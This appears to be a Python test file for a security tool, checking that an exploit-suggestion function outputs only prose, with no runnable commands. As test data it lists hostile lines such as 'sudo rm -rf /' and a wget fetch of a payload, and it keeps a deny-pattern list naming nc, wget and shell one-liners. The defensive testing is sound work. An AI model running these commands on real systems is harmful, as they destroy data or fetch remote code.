"""Invariant test: suggest_exploit_prose never emits runnable payloads.

This test enforces the safety-critical contract documented in
docs/MCP-INTERFACE.md and ETHICS.md. If it fails, do NOT relax the test —
fix the implementation.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))

from phantom_secops import core  # type: ignore[import-not-found]
from phantom_secops.mcp import safety  # type: ignore[import-not-found]


def test_safety_validator_rejects_known_bad_lines() -> None:
    """safety.is_safe_prose backs both this test and the LLM-augmented path."""
    bad = [
        "$ ls -la /etc",
        "sudo rm -rf /",
        "curl -X POST http://target/x",
        "wget http://example.com/payload",
        "```bash\nrm -rf /\n```",
    ]
    for s in bad:
        assert not safety.is_safe_prose(s), f"should have flagged: {s!r}"


def test_safety_validator_accepts_normal_prose() -> None:
    good = [
        "This vulnerability allows DOM-based XSS. Mitigation: upgrade jQuery.",
        "Administrative interface reachable without auth. Require auth on /admin.",
        "",  # empty is safe (caller will fall back)
    ]
    for s in good:
        assert safety.is_safe_prose(s), f"should have accepted: {s!r}"


def test_invariant_flag_always_false() -> None:
    """has_runnable_poc must always be literal False."""
    for findings in (
        [],
        [{"id": "x", "title": "jquery 1.7.2", "cve": "CVE-2020-11023",
          "severity": "medium"}],
        [{"id": "x", "title": "Exposed admin panel", "severity": "high"}],
        [{"id": "x", "title": "low-noise", "severity": "low"}],
    ):
        out = core.suggest_exploit_prose(findings)
        assert out["has_runnable_poc"] is False, "invariant violated"


def test_no_shell_or_curl_lines() -> None:
    """Output markdown must not contain executable shell/curl/payload patterns."""
    findings = [
        {"id": "t1", "title": "Exposed admin panel", "severity": "high"},
        {"id": "t2", "title": "jQuery XSS", "cve": "CVE-2020-11023", "severity": "medium"},
        {"id": "t3", "title": "Random low finding", "severity": "low"},
    ]
    md = core.suggest_exploit_prose(findings)["markdown"]

    # Lines that begin with these are usually executable.
    forbidden_line_starts = (r"\$\s", r"sudo\s", r"curl\s+-X", r"wget\s",
                             r"nc\s+-", r"python\s+-c", r"bash\s+-c",
                             r"sh\s+-c", r"docker\s+exec\s")
    for pattern in forbidden_line_starts:
        assert not re.search(rf"^\s*{pattern}", md, re.MULTILINE), (
            f"output contains potentially runnable line matching: {pattern}"
        )

    # Code fences with shell content are also forbidden.
    assert "```bash" not in md
    assert "```sh" not in md
    assert "```shell" not in md
